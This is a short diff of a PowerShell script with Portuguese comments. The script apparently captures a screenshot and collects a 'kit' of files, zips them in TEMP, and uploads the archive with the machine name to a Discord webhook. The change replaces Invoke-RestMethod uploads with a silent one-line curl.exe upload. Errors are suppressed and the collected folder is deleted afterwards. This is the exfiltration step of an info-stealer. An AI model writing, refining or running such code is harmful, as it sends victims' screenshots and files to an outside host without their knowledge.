@@ -71,14 +71,7 @@ $g.Dispose(); $bmp.Dispose()
 $zip = "$env:TEMP\kit_$(Get-Date -Format yyyyMMdd_HHmmss).zip"
 Compress-Archive -Path "$kit\*" -Destination $zip -Force
 
-# ---------- ENVIO DISCORD (jeito sem multipart) ----------
-try {
-    $msg  = "Kit $env:COMPUTERNAME – $(Get-Date)"
-    # 1) envia a mensagem
-    Invoke-RestMethod -Uri $hook -Method Post -ContentType "application/json" -Body (@{content=$msg} | ConvertTo-Json)
-    # 2) envia o arquivo
-    Invoke-RestMethod -Uri $hook -Method Post -InFile $zip -ContentType "application/zip"
-} catch {}
+# ---------- ENVIO DISCORD (curl simples, 1 linha) ----------
+curl.exe -F "file=@`"$zip`"" -F "content=Kit $env:COMPUTERNAME – $(Get-Date)" $hook 2>$null
 # ---------- limpa ----------
 Remove-Item $kit -Recurse -Force
-
